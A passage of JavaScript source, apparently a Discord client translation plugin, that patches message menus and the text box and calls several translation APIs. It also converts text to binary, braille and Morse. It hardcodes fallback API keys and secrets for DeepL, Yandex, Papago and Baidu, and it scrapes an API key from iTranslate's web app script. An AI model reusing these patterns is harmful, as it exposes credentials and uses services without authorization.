											`${BDFDB.LanguageUtils.LibraryStrings.to} ${foundOutput.name}:`,
											foundTranslation
										].map(n => BDFDB.ReactUtils.createElement("div", {children: n})), {
											type: "right",
											color: "black",
											className: "googletranslate-tooltip"
										});
									};
									if (foundTranslation && foundInput && foundOutput) {
										if (document.querySelector(".googletranslate-tooltip")) {
											BDFDB.ContextMenuUtils.close(e.instance);
											BDFDB.DiscordUtils.openLink(this.getGoogleTranslatePageURL(foundInput.id, foundOutput.id, text));
										}
										else createTooltip();
									}
									else if (!translating) {
										translating = true;
										this.translateText(text, messageTypes.RECEIVED, (translation, input, output) => {
											if (translation) {
												foundTranslation = translation, foundInput = input, foundOutput = output;
												createTooltip();
											}
										});
									}
								}
							}
						})
					}));
				}
			}
			
			onMessageOptionContextMenu (e) {
				if (e.instance.props.message && e.instance.props.channel) {
					let translated = !!translatedMessages[e.instance.props.message.id];
					let [children, index] = BDFDB.ContextMenuUtils.findItem(e.returnvalue, {id: ["pin", "unpin"]});
					children.splice(index + 1, 0, BDFDB.ContextMenuUtils.createItem(BDFDB.LibraryComponents.MenuItems.MenuItem, {
						label: translated ? this.labels.context_messageuntranslateoption : this.labels.context_messagetranslateoption,
						disabled: isTranslating,
						id: BDFDB.ContextMenuUtils.createItemId(this.name, translated ? "untranslate-message" : "translate-message"),
						icon: _ => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.MenuItems.MenuIcon, {
							icon: translated ? translateIconUntranslate : translateIcon
						}),
						action: _ => this.translateMessage(e.instance.props.message, e.instance.props.channel)
					}));
				}
			}
		
			onMessageOptionToolbar (e) {
				if (e.instance.props.expanded && e.instance.props.message && e.instance.props.channel) {
					let translated = !!translatedMessages[e.instance.props.message.id];
					e.returnvalue.props.children.unshift();
					e.returnvalue.props.children.unshift(BDFDB.ReactUtils.createElement(class extends BdApi.React.Component {
						render() {
							return BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.TooltipContainer, {
								key: translated ? "untranslate-message" : "translate-message",
								text: _ => translated ? _this.labels.context_messageuntranslateoption : _this.labels.context_messagetranslateoption,
								children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Clickable, {
									className: BDFDB.disCN.messagetoolbarbutton,
									onClick: _ => {
										if (!isTranslating) _this.translateMessage(e.instance.props.message, e.instance.props.channel).then(_ => {
											translated = !!translatedMessages[e.instance.props.message.id];
											BDFDB.ReactUtils.forceUpdate(this);
										});
									},
									children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SvgIcon, {
										className: BDFDB.disCN.messagetoolbaricon,
										iconSVG: translated ? translateIconUntranslate : translateIcon
									})
								})
							});
						}
					}));
				}
			}
			
			processChannelTextAreaForm (e) {
				BDFDB.PatchUtils.patch(this, e.instance, "handleSendMessage", {instead: e2 => {
					if (this.isTranslationEnabled(e.instance.props.channel.id) && e2.methodArguments[0].value) {
						e2.stopOriginalMethodCall();
						this.translateText(e2.methodArguments[0].value, messageTypes.SENT, (translation, input, output) => {
							translation = !translation ? e2.methodArguments[0].value : (this.settings.general.sendOriginalMessage ? (translation + "\n\n> *" + e2.methodArguments[0].value.split("\n").join("*\n> *") + "*") : translation);
							e2.originalMethod(Object.assign({}, e2.methodArguments[0], {value: translation}));
						});
						return Promise.resolve({
							shouldClear: true,
							shouldRefocus: true
						});
					}
					return e2.callOriginalMethodAfterwards();
				}}, {force: true, noCache: true});
			}

			processChannelEditorContainer (e) {
				if (this.isTranslationEnabled(e.instance.props.channel.id) && isTranslating) e.instance.props.disabled = true;
			}
			
			processChannelTextAreaButtons (e) {
				if (this.settings.general.addTranslateButton && (e.instance.props.type == BDFDB.LibraryComponents.ChannelTextAreaTypes.NORMAL || e.instance.props.type == BDFDB.LibraryComponents.ChannelTextAreaTypes.NORMAL_WITH_ACTIVITY || e.instance.props.type == BDFDB.LibraryComponents.ChannelTextAreaTypes.SIDEBAR) && !e.instance.props.disabled) {
					e.returnvalue.props.children.unshift(BDFDB.ReactUtils.createElement(TranslateButtonComponent, {
						channelId: e.instance.props.channel.id
					}));
				}
			}

			processMessages (e) {
				e.returnvalue.props.children.props.channelStream = [].concat(e.returnvalue.props.children.props.channelStream);
				for (let i in e.returnvalue.props.children.props.channelStream) {
					let message = e.returnvalue.props.children.props.channelStream[i].content;
					if (message) {
						if (BDFDB.ArrayUtils.is(message.attachments)) this.checkMessage(e.returnvalue.props.children.props.channelStream[i], message);
						else if (BDFDB.ArrayUtils.is(message)) for (let j in message) {
							let childMessage = message[j].content;
							if (childMessage && BDFDB.ArrayUtils.is(childMessage.attachments)) this.checkMessage(message[j], childMessage);
						}
					}
				}
			}
			
			checkMessage (stream, message) {
				let translation = translatedMessages[message.id];
				if (translation) stream.content.content = translation.content;
				else if (oldMessages[message.id] && Object.keys(message).some(key => !BDFDB.equals(oldMessages[message.id][key], message[key]))) {
					stream.content.content = oldMessages[message.id].content;
					delete oldMessages[message.id];
				}
			}

			processMessageContent (e) {
				if (e.instance.props.message) {
					let translation = translatedMessages[e.instance.props.message.id];
					if (translation && translation.content) e.returnvalue.props.children.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.TooltipContainer, {
						text: `${BDFDB.LanguageUtils.getName(translation.input)} ➝ ${BDFDB.LanguageUtils.LibraryStrings.to} ${BDFDB.LanguageUtils.getName(translation.output)}`,
						tooltipConfig: {style: "max-width: 400px"},
						children: BDFDB.ReactUtils.createElement("span", {
							className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.messagetimestamp, BDFDB.disCN.messagetimestampinline, BDFDB.disCN._translatortranslated),
							children: BDFDB.ReactUtils.createElement("span", {
								className: BDFDB.disCN.messageedited,
								children: `(${this.labels.translated_watermark})`
							})
						})
					}));
				}
			}

			processEmbed (e) {
				if (e.instance.props.embed && e.instance.props.embed.message_id) {
					let translation = translatedMessages[e.instance.props.embed.message_id];
					if (translation && Object.keys(translation.embeds).length) {
						if (!e.returnvalue) e.instance.props.embed = Object.assign({}, e.instance.props.embed, {
							rawDescription: translation.embeds[e.instance.props.embed.id],
							originalDescription: e.instance.props.embed.originalDescription || e.instance.props.embed.rawDescription
						});
						else {
							let [children, index] = BDFDB.ReactUtils.findParent(e.returnvalue, {props: [["className", BDFDB.disCN.embeddescription]]});
							if (index > -1) children[index].props.children.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.TooltipContainer, {
								text: `${BDFDB.LanguageUtils.getName(translation.input)} ➝ ${BDFDB.LanguageUtils.getName(translation.output)}`,
								tooltipConfig: {style: "max-width: 400px"},
								children: BDFDB.ReactUtils.createElement("span", {
									className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.messagetimestamp, BDFDB.disCN.messagetimestampinline, BDFDB.disCN._translatortranslated),
									children: BDFDB.ReactUtils.createElement("span", {
										className: BDFDB.disCN.messageedited,
										children: `(${this.labels.translated_watermark})`
									})
								})
							}));
						}
					}
					else if (!e.returnvalue && e.instance.props.embed.originalDescription) {
						e.instance.props.embed = Object.assign({}, e.instance.props.embed, {rawDescription: e.instance.props.embed.originalDescription});
						delete e.instance.props.embed.originalDescription;
					}
				}
			}
			
			toggleTranslation (channelId) {
				if (!this.isTranslationEnabled(channelId)) translationEnabledStates.push(this.settings.general.usePerChatTranslation ? channelId : "global");
				else BDFDB.ArrayUtils.remove(translationEnabledStates, this.settings.general.usePerChatTranslation ? channelId : "global", true);
			}
			
			isTranslationEnabled (channelId) {
				return translationEnabledStates.includes(this.settings.general.usePerChatTranslation ? channelId : "global");
			}

			setLanguages () {
				if (this.settings.engines.translator == this.settings.engines.backup) {
					this.settings.engines.backup = Object.keys(translationEngines).filter(n => n != this.settings.engines.translator)[0];
					BDFDB.DataUtils.save(this.settings.engines, this, "engines");
				}
				let engine = translationEngines[this.settings.engines.translator] || {};
				let backup = translationEngines[this.settings.engines.backup] || {};
				let languageIds = [].concat(engine.languages, backup.languages).flat(10).filter(n => n);
				languages = BDFDB.ObjectUtils.deepAssign(
					!engine.auto && !backup.auto ? {} : {
						auto: {
							auto: true,
							name: "Detect Language",
							id: "auto"
						}
					},
					BDFDB.ObjectUtils.filter(BDFDB.LanguageUtils.languages, lang => languageIds.includes(lang.id)),
					{
						binary:	{
							special: true,
							name: "Binary",
							id: "binary"
						},
						braille: {
							special: true,
							name: "Braille 6-dot",
							id: "braille"
						},
						morse: {
							special: true,
							name: "Morse",
							id: "morse"
						}
					}
				);
				for (let id in languages) languages[id].fav = favorites.includes(id) ? 0 : 1;
				languages = BDFDB.ObjectUtils.sort(languages, "fav");
			}

			getLanguageChoice (direction, place, channelId) {
				this.setLanguages();
				let choice;
				if (channelLanguages[channelId] && channelLanguages[channelId][place]) choice = channelLanguages[channelId][place][direction];
				else choice = this.settings.choices[place] && this.settings.choices[place][direction];
				choice = languages[choice] ? choice : Object.keys(languages)[0];
				choice = direction == languageTypes.OUTPUT && choice == "auto" ? "en" : choice;
				return choice;
			}

			saveLanguageChoice (choice, direction, place, channelId) {
				if (channelLanguages[channelId] && channelLanguages[channelId][place]) {
					channelLanguages[channelId][place][direction] = choice;
					BDFDB.DataUtils.save(channelLanguages, this, "channelLanguages");
				}
				else {
					this.settings.choices[place][direction] = choice;
					BDFDB.DataUtils.save(this.settings.choices, this, "choices");
				}
			}

			translateMessage (message, channel) {
				return new Promise(callback => {
					if (!message) return callback(null);
					if (translatedMessages[message.id]) {
						delete translatedMessages[message.id];
						BDFDB.MessageUtils.rerenderAll(true);
						callback(false);
					}
					else {
						let orignalContent = message.content || "";
						for (let embed of message.embeds) orignalContent += ("\n__________________ __________________ __________________\n" + embed.rawDescription);
						this.translateText(orignalContent, messageTypes.RECEIVED, (translation, input, output) => {
							if (translation) {
								oldMessages[message.id] = new BDFDB.DiscordObjects.Message(message);
								let oldStrings = orignalContent.split(/\n{0,1}__________________ __________________ __________________\n{0,1}/);
								let strings = translation.split(/\n{0,1}__________________ __________________ __________________\n{0,1}/);
								let oldContent = this.settings.general.showOriginalMessage && (oldStrings.shift() || "").trim();
								let content = (strings.shift() || "").trim() + (oldContent ? `\n\n${oldContent}` : "");
								let embeds = {};
								for (let i in message.embeds) {
									message.embeds[i].message_id = message.id;
									let oldEmbedString = this.settings.general.showOriginalMessage && (oldStrings.shift() || "").trim();
									embeds[message.embeds[i].id] = (strings.shift() || message.embeds[i].rawDescription).trim() + (oldEmbedString ? `\n\n${oldEmbedString}` : "");
								}
								translatedMessages[message.id] = {content, embeds, input, output};
								BDFDB.MessageUtils.rerenderAll(true);
							}
							callback(true);
						});
					}
				});
			}

			translateText (text, place, callback) {
				let toast = null, toastInterval, finished = false, finishTranslation = translation => {
					isTranslating = false;
					if (toast) toast.close();
					
					if (finished) return;
					finished = true;
					if (translation) translation = this.addExceptions(translation, excepts);
					callback(translation == text ? "" : translation, input, output);
				};
				let [newText, excepts, translate] = this.removeExceptions(text.trim(), place);
				let channelId = BDFDB.LibraryModules.LastChannelStore.getChannelId();
				let input = Object.assign({}, languages[this.getLanguageChoice(languageTypes.INPUT, place, channelId)]);
				let output = Object.assign({}, languages[this.getLanguageChoice(languageTypes.OUTPUT, place, channelId)]);
				if (translate && input.id != output.id) {
					let specialCase = this.checkForSpecialCase(newText, input);
					if (specialCase) {
						input.name = specialCase.name;
						switch (specialCase.id) {
							case "binary": newText = this.binary2string(newText); break;
							case "braille": newText = this.braille2string(newText); break;
							case "morse": newText = this.morse2string(newText); break;
						}
					}
					if (output.special) {
						switch (output.id) {
							case "binary": newText = this.string2binary(newText); break;
							case "braille": newText = this.string2braille(newText); break;
							case "morse": newText = this.string2morse(newText); break;
						}
						finishTranslation(newText);
					}
					else {
						const startTranslating = engine => {
							isTranslating = true;
							if (toast) toast.close();
							BDFDB.TimeUtils.clear(toastInterval);
							
							toast = BDFDB.NotificationUtils.toast(`${this.labels.toast_translating} (${translationEngines[engine].name}) - ${BDFDB.LanguageUtils.LibraryStrings.please_wait}`, {
								timeout: 0,
								ellipsis: true,
								position: "center",
								onClose: _ => BDFDB.TimeUtils.clear(toastInterval)
							});
							toastInterval = BDFDB.TimeUtils.interval((_, count) => {
								if (count < 40) return;
								finishTranslation("");
								BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed} (${translationEngines[engine].name}) - ${this.labels.toast_translating_tryanother}`, {
									type: "danger",
									position: "center"
								});
							}, 500);
						};
						if (this.validTranslator(this.settings.engines.translator, input, output, specialCase)) {
							startTranslating(this.settings.engines.translator);
							this[translationEngines[this.settings.engines.translator].funcName].apply(this, [{input, output, text: newText, specialCase, engine: translationEngines[this.settings.engines.translator]}, translation => {
								if (!translation && this.validTranslator(this.settings.engines.backup, input, output, specialCase)) {
									startTranslating(this.settings.engines.backup);
									this[translationEngines[this.settings.engines.backup].funcName].apply(this, [{input, output, text: newText, specialCase, engine: translationEngines[this.settings.engines.backup]}, finishTranslation]);
								}
								else finishTranslation(translation);
							}]);
						}
						else if (this.validTranslator(this.settings.engines.backup, input, output, specialCase)) {
							startTranslating(this.settings.engines.backup);
							this[translationEngines[this.settings.engines.backup].funcName].apply(this, [{input, output, text: newText, specialCase, engine: translationEngines[this.settings.engines.backup]}, finishTranslation]);
						}
						else finishTranslation();
					}
				}
				else finishTranslation();
			}
			
			validTranslator (key, input, output, specialCase) {
				return translationEngines[key] && typeof this[translationEngines[key].funcName] == "function" && (specialCase || input.auto && translationEngines[key].auto || translationEngines[key].languages.includes(input.id) && translationEngines[key].languages.includes(output.id));
			}
			
			googleApiTranslate (data, callback) {
				BDFDB.LibraryRequires.request(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=${data.input.id}&tl=${data.output.id}&dt=t&dj=1&source=input&q=${encodeURIComponent(data.text)}`, (error, response, body) => {
					if (!error && body && response.statusCode == 200) {
						try {
							body = JSON.parse(body);
							if (!data.specialCase && body.src && body.src && languages[body.src]) {
								data.input.name = languages[body.src].name;
								data.input.ownlang = languages[body.src].ownlang;
							}
							callback(body.sentences.map(n => n && n.trans).filter(n => n).join(""));
						}
						catch (err) {callback("");}
					}
					else {
						if (response.statusCode == 429) BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Hourly Request Limit reached.`, {
							type: "danger",
							position: "center"
						});
						else BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Translation Server might be down.`, {
							type: "danger",
							position: "center"
						});
						callback("");
					}
				});
			}
			
			deepLTranslate (data, callback) {
				BDFDB.LibraryRequires.request(`${authKeys.deepl && authKeys.deepl.paid ? "https://api.deepl.com/v2/translate" : "https://api-free.deepl.com/v2/translate"}?auth_key=${authKeys.deepl && authKeys.deepl.key || "75cc2f40-fdae-14cd-7242-6a384e2abb9c:fx"}&text=${encodeURIComponent(data.text)}${data.input.auto ? "" : `&source_lang=${data.input.id}`}&target_lang=${data.output.id}`, (error, response, body) => {
					if (!error && body && response.statusCode == 200) {
						try {
							body = JSON.parse(body);
							if (!data.specialCase && body.translations[0] && body.translations[0].detected_source_language && languages[body.translations[0].detected_source_language.toLowerCase()]) {
								data.input.name = languages[body.translations[0].detected_source_language.toLowerCase()].name;
								data.input.ownlang = languages[body.translations[0].detected_source_language.toLowerCase()].ownlang;
							}
							callback(body.translations.map(n => n && n.text).filter(n => n).join(""));
						}
						catch (err) {callback("");}
					}
					else {
						if (response.statusCode == 429 || response.statusCode == 456) BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Daily Request Limit reached.`, {
							type: "danger",
							position: "center"
						});
						else if (response.statusCode == 403) BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. API-Key outdated.`, {
							type: "danger",
							position: "center"
						});
						else BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Translation Server might be down.`, {
							type: "danger",
							position: "center"
						});
						callback("");
					}
				});
			}
			
			iTranslateTranslate (data, callback) {
				let translate = _ => {
					BDFDB.LibraryRequires.request.post({
						url: "https://web-api.itranslateapp.com/v3/texts/translate",
						headers: {
							"API-KEY": authKeys.itranslate && authKeys.itranslate.key || data.engine.APIkey
						},
						body: JSON.stringify({
							source: {
								dialect: data.input.id,
								text: data.text
							},
							target: {
								dialect: data.output.id
							}
						})
					}, (error, response, body) => {
						if (!error && response && response.statusCode == 200) {
							try {
								body = JSON.parse(body);
								if (!data.specialCase && body.source && body.source.dialect && languages[body.source.dialect]) {
									data.input.name = languages[body.source.dialect].name;
									data.input.ownlang = languages[body.source.dialect].ownlang;
								}
								callback(body.target.text);
							}
							catch (err) {callback("");}
						}
						else {
							if (response.statusCode == 429) BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Daily Request Limit reached.`, {
								type: "danger",
								position: "center"
							});
							else if (response.statusCode == 403) BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. API-Key outdated.`, {
								type: "danger",
								position: "center"
							});
							else BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Translation Server might be down.`, {
								type: "danger",
								position: "center"
							});
							callback("");
						}
					});
				};
				if (authKeys.itranslate && authKeys.itranslate.key || data.engine.APIkey) translate();
				else BDFDB.LibraryRequires.request("https://www.itranslate.com/js/webapp/main.js", {gzip: true}, (error, response, body) => {
					if (!error && body) {
						let APIkey = /var API_KEY = "(.+)"/.exec(body);
						if (APIkey) {
							data.engine.APIkey = APIkey[1];
							translate();
						}
						else callback("");
					}
					else callback("");
				});
			}
			
			yandexTranslate (data, callback) {
				BDFDB.LibraryRequires.request(`https://translate.yandex.net/api/v1.5/tr/translate?key=${authKeys.yandex && authKeys.yandex.key || "trnsl.1.1.20191206T223907Z.52bd512eca953a5b.1ec123ce4dcab3ae859f312d27cdc8609ab280de"}&text=${encodeURIComponent(data.text)}&lang=${data.specialCase || data.input.auto ? data.output.id : (data.input.id + "-" + data.output.id)}&options=1`, (error, response, body) => {
					if (!error && body && response.statusCode == 200) {
						try {
							body = BDFDB.DOMUtils.create(body);
							let translation = body.querySelector("text");
							let detected = body.querySelector("detected");
							if (translation && detected) {
								let detectedLang = detected.getAttribute("lang");
								if (!data.specialCase && detectedLang && languages[detectedLang]) {
									data.input.name = languages[detectedLang].name;
									data.input.ownlang = languages[detectedLang].ownlang;
								}
								callback(translation.innerText);
							}
							else callback("");
						}
						catch (err) {callback("");}
					}
					else if (body && body.indexOf('code="408"') > -1) {
						BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Monthly Request Limit reached.`, {
							type: "danger",
							position: "center"
						});
						callback("");
					}
					else {
						BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Translation Server down or API-Key outdated.`, {
							type: "danger",
							position: "center"
						});
						callback("");
					}
				});
			}
			
			papagoTranslate (data, callback) {
				const credentials = (authKeys.papago && authKeys.papago.key || "kUNGxtAmTJQFbaFehdjk zC70k3VhpM").split(" ");
				BDFDB.LibraryRequires.request.post({
					url: "https://openapi.naver.com/v1/papago/n2mt",
					form: {
						source: data.input.id,
						target: data.output.id,
						text: data.text
					},
					headers: {
						"X-Naver-Client-Id": credentials[0],
						"X-Naver-Client-Secret": credentials[1]
					}
				}, (error, response, body) => {
					if (!error && body && response.statusCode == 200) {
						try {
							let message = (JSON.parse(body) || {}).message;
							let result = message && (message.body || message.result);
							if (result && result.translatedText) callback(result.translatedText);
							else callback("");
						}
						catch (err) {callback("");}
					}
					else {
						if (response.statusCode == 429) BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Hourly Request Limit reached.`, {
							type: "danger",
							position: "center"
						});
						else BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Translation Server is down or API-key outdated.`, {
							type: "danger",
							position: "center"
						});
						callback("");
					}
				});
			}
			
			baiduTranslate (data, callback) {
				const credentials = (authKeys.baidu && authKeys.baidu.key || "20210425000799880 e12h9h4rh39r8h12r8 D90usZcbznwthzKC1KOb").split(" ");
				BDFDB.LibraryRequires.request.post({
					url: "https://fanyi-api.baidu.com/api/trans/vip/translate",
					form: {
						from: translationEngines.baidu.parser[data.input.id] || data.input.id,
						to: translationEngines.baidu.parser[data.output.id] || data.output.id,
						q: data.text,
						appid: credentials[0],
						salt: credentials[1],
						sign: this.MD5(credentials[0] + data.text + credentials[1] + credentials[2])
					}
				}, (error, response, result) => {
					if (!error && result && response.statusCode == 200) {
						try {
							result = JSON.parse(result) || {};
							if (!result.error_code) {
								let messages = result.trans_result;
								if (messages && messages.length > 0 && result.from != result.to) callback(messages.map(message => decodeURIComponent(message.dst)).join("\n"));
								else {callback("");}
							}
							else {
								BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. ${result.error_code} : ${result.error_msg}.`, {
									type: "danger",
									position: "center"
								});
								callback("");
							}
						}
						catch (err) {callback("");}
					}
					else {
						BDFDB.NotificationUtils.toast(`${this.labels.toast_translating_failed}. ${this.labels.toast_translating_tryanother}. Translation Server is down.`, {
							type: "danger",
							position: "center"
						});
						callback("");
					}
				});
			}
			
			MD5 (e) {
				function h(a, b) {
					var e = a & 2147483648, f = b & 2147483648, c = a & 1073741824, d = b & 1073741824, g = (a & 1073741823) + (b & 1073741823);
					return c & d ? g ^ 2147483648 ^ e ^ f : c | d ? g & 1073741824 ? g ^ 3221225472 ^ e ^ f : g ^ 1073741824 ^ e ^ f : g ^ e ^ f
				}
				function k(a, b, c, d, e, f, g) {
					a = h(a, h(h(b & c | ~b & d, e), g));
					return h(a << f | a >>> 32 - f, b);
				}
				function l(a, b, c, d, e, f, g) {
					a = h(a, h(h(b & d | c & ~d, e), g));
					return h(a << f | a >>> 32 - f, b);
				}
				function m(a, b, d, c, e, f, g) {
					a = h(a, h(h(b ^ d ^ c, e), g));
					return h(a << f | a >>> 32 - f, b)
				}
				function n(a, b, d, c, e, f, g) {
					a = h(a, h(h(d ^ (b | ~c), e), g));
					return h(a << f | a >>> 32 - f, b);
				}
				function p(a) {
					var b = "", d = "", c;
					for (c = 0; 3 >= c; c++) d = a >>> 8 * c & 255, d = "0" + d.toString(16), b += d.substr(d.length - 2, 2);
					return b;
				}
				
				var f = [], q, r, s, t, a, b, c, d;
				e = function(a) {
					a = a.replace(/\r\n/g, "\n");
					for (var b = "", d = 0; d < a.length; d++) {
						var c = a.charCodeAt(d);
						128 > c ? b += String.fromCharCode(c) : (127 < c && 2048 > c ? b += String.fromCharCode(c >> 6 | 192) : (b += String.fromCharCode(c >> 12 | 224), b += String.fromCharCode(c >> 6 & 63 | 128)), b += String.fromCharCode(c & 63 | 128))
					}
					return b;
				}(e);
				f = function(b) {
					var a, c = b.length;
					a = c + 8;
					for (var d = 16 * ((a - a % 64) / 64 + 1), e = Array(d - 1), f = 0, g = 0; g < c;) a = (g - g % 4) / 4, f = g % 4 * 8, e[a] |= b.charCodeAt(g) << f, g++;
					a = (g - g % 4) / 4;
					e[a] |= 128 << g % 4 * 8;
					e[d - 2] = c << 3;
					e[d - 1] = c >>> 29;
					return e
				}(e);
				a = 1732584193, b = 4023233417, c = 2562383102, d = 271733878;
				for (e = 0; e < f.length; e += 16) q = a, r = b, s = c, t = d, a = k(a, b, c, d, f[e + 0], 7, 3614090360), d = k(d, a, b, c, f[e + 1], 12, 3905402710), c = k(c, d, a, b, f[e + 2], 17, 606105819), b = k(b, c, d, a, f[e + 3], 22, 3250441966), a = k(a, b, c, d, f[e + 4], 7, 4118548399), d = k(d, a, b, c, f[e + 5], 12, 1200080426), c = k(c, d, a, b, f[e + 6], 17, 2821735955), b = k(b, c, d, a, f[e + 7], 22, 4249261313), a = k(a, b, c, d, f[e + 8], 7, 1770035416), d = k(d, a, b, c, f[e + 9], 12, 2336552879), c = k(c, d, a, b, f[e + 10], 17, 4294925233), b = k(b, c, d, a, f[e + 11], 22, 2304563134), a = k(a, b, c, d, f[e + 12], 7, 1804603682), d = k(d, a, b, c, f[e + 13], 12, 4254626195), c = k(c, d, a, b, f[e + 14], 17, 2792965006), b = k(b, c, d, a, f[e + 15], 22, 1236535329), a = l(a, b, c, d, f[e + 1], 5, 4129170786), d = l(d, a, b, c, f[e + 6], 9, 3225465664), c = l(c, d, a, b, f[e + 11], 14, 643717713), b = l(b, c, d, a, f[e + 0], 20, 3921069994), a = l(a, b, c, d, f[e + 5], 5, 3593408605), d = l(d, a, b, c, f[e + 10], 9, 38016083), c = l(c, d, a, b, f[e + 15], 14, 3634488961), b = l(b, c, d, a, f[e + 4], 20, 3889429448), a = l(a, b, c, d, f[e + 9], 5, 568446438), d = l(d, a, b, c, f[e + 14], 9, 3275163606), c = l(c, d, a, b, f[e + 3], 14, 4107603335), b = l(b, c, d, a, f[e + 8], 20, 1163531501), a = l(a, b, c, d, f[e + 13], 5, 2850285829), d = l(d, a, b, c, f[e + 2], 9, 4243563512), c = l(c, d, a, b, f[e + 7], 14, 1735328473), b = l(b, c, d, a, f[e + 12], 20, 2368359562), a = m(a, b, c, d, f[e + 5], 4, 4294588738), d = m(d, a, b, c, f[e + 8], 11, 2272392833), c = m(c, d, a, b, f[e + 11], 16, 1839030562), b = m(b, c, d, a, f[e + 14], 23, 4259657740), a = m(a, b, c, d, f[e + 1], 4, 2763975236), d = m(d, a, b, c, f[e + 4], 11, 1272893353), c = m(c, d, a, b, f[e + 7], 16, 4139469664), b = m(b, c, d, a, f[e + 10], 23, 3200236656), a = m(a, b, c, d, f[e + 13], 4, 681279174), d = m(d, a, b, c, f[e + 0], 11, 3936430074), c = m(c, d, a, b, f[e + 3], 16, 3572445317), b = m(b, c, d, a, f[e + 6], 23, 76029189), a = m(a, b, c, d, f[e + 9], 4, 3654602809), d = m(d, a, b, c, f[e + 12], 11, 3873151461), c = m(c, d, a, b, f[e + 15], 16, 530742520), b = m(b, c, d, a, f[e + 2], 23, 3299628645), a = n(a, b, c, d, f[e + 0], 6, 4096336452), d = n(d, a, b, c, f[e + 7], 10, 1126891415), c = n(c, d, a, b, f[e + 14], 15, 2878612391), b = n(b, c, d, a, f[e + 5], 21, 4237533241), a = n(a, b, c, d, f[e + 12], 6, 1700485571), d = n(d, a, b, c, f[e + 3], 10, 2399980690), c = n(c, d, a, b, f[e + 10], 15, 4293915773), b = n(b, c, d, a, f[e + 1], 21, 2240044497), a = n(a, b, c, d, f[e + 8], 6, 1873313359), d = n(d, a, b, c, f[e + 15], 10, 4264355552), c = n(c, d, a, b, f[e + 6], 15, 2734768916), b = n(b, c, d, a, f[e + 13], 21, 1309151649), a = n(a, b, c, d, f[e + 4], 6, 4149444226), d = n(d, a, b, c, f[e + 11], 10, 3174756917), c = n(c, d, a, b, f[e + 2], 15, 718787259), b = n(b, c, d, a, f[e + 9], 21, 3951481745), a = h(a, q), b = h(b, r), c = h(c, s), d = h(d, t);
				return (p(a) + p(b) + p(c) + p(d)).toLowerCase();
			}

			checkForSpecialCase (text, input) {
				if (input.special) return input;
				else if (input.auto) {
					if (/^[0-1]*$/.test(text.replace(/\s/g, ""))) {
						return {id: "binary", name: "Binary"};
					}
					else if (/^[⠁⠂⠃⠄⠅⠆⠇⠈⠉⠊⠋⠌⠍⠎⠏⠐⠑⠒⠓⠔⠕⠖⠗⠘⠙⠚⠛⠜⠝⠞⠟⠠⠡⠢⠣⠤⠥⠦⠧⠨⠩⠪⠫⠬⠭⠮⠯⠰⠱⠲⠳⠴⠵⠶⠷⠸⠹⠺⠻⠼⠽⠾⠿]*$/.test(text.replace(/\s/g, ""))) {
						return {id: "braille", name: "Braille 6-dot"};
					}
					else if (/^[/|·−._-]*$/.test(text.replace(/\s/g, ""))) {
						return {id: "morse", name: "Morse"};
					}
				}
				return null;
			}

			string2binary (string) {
				let binary = "";
				for (let character of string) binary += parseInt(character.charCodeAt(0).toString(2)).toPrecision(8).split(".").reverse().join("").toString() + " ";
				return binary;
			}

			string2braille (string) {
				let braille = "";
				for (let character of string) braille += brailleConverter[character.toLowerCase()] ? brailleConverter[character.toLowerCase()] : character;
				return braille;
			}

			string2morse (string) {
				string = string.replace(/ /g, "%%%%%%%%%%");
				let morse = "";
				for (let character of string) morse += (morseConverter[character.toLowerCase()] ? morseConverter[character.toLowerCase()] : character) + " ";
				morse = morse.split("\n");
				for (let i in morse) morse[i] = morse[i].trim();
				return morse.join("\n").replace(/% % % % % % % % % % /g, "/ ");
			}

			binary2string (binary) {
				let string = "";
				binary = binary.replace(/\n/g, "00001010").replace(/\r/g, "00001101").replace(/\t/g, "00001001").replace(/\s/g, "");
				if (/^[0-1]*$/.test(binary)) {
					let eightDigits = "";
					let counter = 0;
					for (let digit of binary) {
						eightDigits += digit;
						counter++;
						if (counter > 7) {
							string += String.fromCharCode(parseInt(eightDigits, 2).toString(10));
							eightDigits = "";
							counter = 0;
						}
					}
				}
				else BDFDB.NotificationUtils.toast("Invalid binary format. Only use 0s and 1s.", {
					type: "danger",
					position: "center"
				});
				return string;
			}

			braille2string (braille) {
				let string = "";
				for (let character of braille) string += brailleConverter[character.toLowerCase()] ? brailleConverter[character.toLowerCase()] : character;
				return string;
			}

			morse2string (morse) {
				let string = "";
				for (let word of morse.replace(/[_-]/g, "−").replace(/\./g, "·").replace(/\r|\t/g, "").split(/\/|\||\n/g)) {
					for (let characterstr of word.trim().split(" ")) string += morseConverter[characterstr] ? morseConverter[characterstr] : characterstr;
					string += " ";
				}
				return string.trim();
			}

			addExceptions (string, excepts) {
				for (let count in excepts) {
